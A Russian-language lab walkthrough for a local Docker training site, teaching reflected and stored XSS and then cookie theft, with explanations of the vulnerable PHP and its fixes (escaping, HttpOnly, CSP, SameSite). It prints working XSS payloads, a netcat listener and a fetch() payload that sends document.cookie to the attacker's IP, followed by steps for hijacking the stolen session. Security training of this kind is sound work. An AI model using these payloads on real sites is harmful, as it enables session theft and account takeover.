# Пошаговое руководство: XSS-атаки

## Задание 4: Отражённая XSS (Reflected)

### Шаг 1: Понимаем отражение

1. Откройте http://xss.vulnforge.local/search.php?q=hello
2. Вы видите: "Результаты поиска для: hello"
3. Ваш ввод из URL отобразился на странице без изменений

**Что это значит?** Приложение берёт параметр `q` из URL и вставляет его в HTML без фильтрации.

### Шаг 2: Тестируем HTML

Попробуйте отрендерить HTML-теги:
```
http://xss.vulnforge.local/search.php?q=<b>жирный текст</b>
```

Если текст стал жирным — HTML-теги работают. Уязвимость подтверждена.

### Шаг 3: Выполняем JavaScript

Теперь попробуем выполнить JavaScript-код:
```
http://xss.vulnforge.local/search.php?q=<img src=x onerror=alert('XSS')>
```

**Что происходит:**
- `<img src=x>` — браузер пытается загрузить картинку из несуществующего источника `x`
- `onerror=alert('XSS')` — когда загрузка не удаётся, срабатывает обработчик ошибки
- `alert('XSS')` — выполняется JavaScript и показывает всплывающее окно

Если появилось всплывающее окно с текстом "XSS" — JavaScript выполнен успешно!

### Шаг 4: Другие пейлоады

Если `<img>` не сработал, пробуем альтернативы:

```html
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<video onloadstart=alert(1) src=x>
```

### Почему это работает?

Код страницы выглядит так:
```php
<h3>Результаты поиска для: <?php echo $_GET['q']; // УЯЗВИМОСТЬ: нет экранирования ?></h3>
```

Функция `echo` выводит содержимое параметра `q` как есть. Если в параметре HTML-теги — они становятся частью страницы.

### Как исправить?

```php
// Правильно: экранировать специальные символы
<h3>Результаты поиска для: <?php echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); ?></h3>
```

`htmlspecialchars()` превращает `<` в `&lt;`, `>` в `&gt;`, `"` в `&quot;` — теги перестают работать.

## Задание 5: Хранимая XSS (Stored)

### Шаг 1: Входим в систему

1. Откройте http://xss.vulnforge.local/index.php
2. Нажмите "Войти как admin" (или любое другое имя)
3. Вы увидите: "Вы вошли как: admin"

### Шаг 2: Оставляем HTML-комментарий

1. В поле комментария введите: `<b>тест</b>`
2. Нажмите "Отправить"
3. Нажмите "Обновить страницу"

Если текст стал жирным — HTML сохранился в базе данных и рендерится у всех посетителей.

### Шаг 3: Внедряем JavaScript

Очистите предыдущий комментарий (или оставьте новый):

```html
<img src=x onerror=alert('XSS')>
```

Теперь каждый, кто откроет эту страницу, увидит всплывающее окно с текстом "XSS".

**Почему это опаснее отражённой XSS:**
- Атакующему не нужно отправлять жертве ссылку
- Код выполняется у ВСЕХ посетителей страницы
- Комментарий остаётся в базе данных надолго

### Шаг 4: Проверяем как другой пользователь

1. Откройте страницу в режиме инкогнито (или другом браузере)
2. Зайдите как другой пользователь (например, "user1")
3. Вы увидите тот же JavaScript-алерт

## Задание 6: Кража cookie через XSS

### Шаг 1: Понимаем цель

Cookie содержат идентификатор сессии. Украв cookie, злоумышленник может войти в систему под учётной записью жертвы.

### Шаг 2: Запускаем сервер для приёма данных

На вашем ПК запустите слушатель:
```bash
nc -lvp 4444
```

### Шаг 3: Определяем IP-адрес

JavaScript на странице выполняется в браузере. `localhost` будет указывать на компьютер жертвы, а не на ваш сервер. Нужно использовать IP вашего ПК в сети Docker:

```bash
# Показать IP шлюза Docker (ваш ПК для контейнеров)
docker network inspect vulnforge-net | grep Gateway
```

Обычно это `172.18.0.1`.

### Шаг 4: Отправляем пейлоад

Войдите как пользователь и оставьте комментарий:

```html
<img src=x onerror="fetch('http://172.18.0.1:4444/?cookie='+document.cookie)">
```

**Разбор пейлоада:**
- `fetch()` — JavaScript-функция для HTTP-запроса
- `172.18.0.1:4444` — IP вашего ПК и порт слушателя
- `document.cookie` — содержит cookie текущего пользователя

### Шаг 5: Проверяем результат

Когда другой пользователь (или вы сами) откроет страницу с комментарием, в netcat придёт запрос:

```
GET /?cookie=PHPSESSID=25edb8ca23e961f9a1726520c77037d4
Host: 172.18.0.1:4444
```

### Шаг 6: Используем украденную сессию

1. Скопируйте значение `PHPSESSID=...`
2. Откройте Инструменты разработчика (F12) → Application → Cookies
3. Замените свою сессию на украденную
4. Обновите страницу — вы вошли как жертва!

### Почему это работает?

1. **Stored XSS** — JavaScript сохраняется в БД и выполняется у всех
2. **HttpOnly выключен** — JavaScript имеет доступ к cookie (флаг HttpOnly не установлен)
3. **SameSite не настроен** — запросы с других источников не блокируются

### Как защититься?

**1. HttpOnly cookie:**
```php
session_set_cookie_params(['httponly' => true]);
```

**2. Content Security Policy (CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**3. Экранирование вывода:**
```php
echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
```

**4. SameSite cookie:**
```php
session_set_cookie_params(['samesite' => 'Strict']);
```
